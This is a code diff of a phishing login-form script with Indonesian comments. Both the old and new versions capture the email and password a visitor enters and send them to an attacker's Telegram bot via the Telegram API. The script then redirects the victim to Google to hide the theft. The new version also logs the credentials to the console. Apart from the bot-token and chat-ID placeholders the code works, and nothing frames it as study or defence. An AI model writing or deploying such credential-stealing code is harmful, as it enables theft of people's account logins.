@@ -1,25 +1,29 @@
 document.getElementById("loginForm").addEventListener("submit", function(event) {
-    event.preventDefault(); // Biar form gak langsung refresh halaman
+    event.preventDefault();
 
-    // Ambil nilai input email & password
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
 
-    // Kirim data ke Telegram (ganti `BOT_TOKEN` & `CHAT_ID` sesuai bot lo)
-    fetch(`https://api.telegram.org/bot[BOT_TOKEN]/sendMessage`, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: "[CHAT_ID]",
-            text: `Email: ${email}\nPassword: ${password}`
+    // Debugging di console
+    console.log("Tombol login ditekan!");
+    console.log(`Email: ${email}, Password: ${password}`);
+
+    // Kirim ke Telegram
+    let botToken = "ISI_BOT_TOKEN_LO";
+    let chatId = "ISI_CHAT_ID_LO";
+    let message = `🔒 *Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+    
+    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log("Berhasil dikirim ke Telegram!");
+                window.location.href = "https://www.google.com"; // Redirect ke Google
+            } else {
+                console.error("Gagal kirim ke Telegram!", data);
+            }
         })
-    }).then(response => response.json())
-    .then(data => {
-        console.log("Pesan terkirim:", data);
-        // Redirect ke Google setelah berhasil kirim ke Telegram
-        window.location.href = "https://www.google.com";
-    })
-    .catch(error => console.error("Gagal kirim pesan:", error));
+        .catch(error => console.error("Error:", error));
 });
